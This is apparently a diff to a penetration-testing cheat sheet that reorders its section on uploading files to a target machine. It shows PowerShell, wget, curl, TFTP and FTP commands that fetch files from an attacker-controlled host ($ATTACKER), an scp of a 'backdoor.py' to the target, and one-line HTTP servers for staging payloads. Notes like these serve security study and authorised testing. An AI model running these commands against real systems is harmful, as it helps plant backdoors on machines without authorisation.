@@ -129,16 +129,6 @@ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 
 ##### Uploading Files to Target Machine
 
-###### Setting up Simple HTTP server
-
-```bash
-# Linux
-python -m SimpleHTTPServer 80
-python3 -m http.server
-ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
-php -S 0.0.0.0:80
-```
-
 ###### TFTP
 ```bash
 #tftp; Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
@@ -146,18 +136,6 @@ service atftpd start
 
 # Windows
 tftp -i $ATTACKER get /download/location/file /save/location/file
-```
-
-###### HTTP
-```PowerShell
-powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
-```
-
-```bash
-# Linux
-wget http://$ATTACKER/file
-curl http://$ATTACKER/file
-scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
 ```
 
 ###### FTP
@@ -174,6 +152,29 @@ echo get file.exe>>ftp-commands.txt
 echo bye>>ftp-commands.txt 
 ftp -s:ftp-commands.txt
 ```
+
+###### HTTP
+```PowerShell
+powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
+```
+
+```bash
+# Linux
+wget http://$ATTACKER/file
+curl http://$ATTACKER/file
+scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
+```
+
+###### Setting up Simple HTTP server
+
+```bash
+# Linux
+python -m SimpleHTTPServer 80
+python3 -m http.server
+ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
+php -S 0.0.0.0:80
+```
+
 
 ##### Bash Ping Sweeper
 ```bash
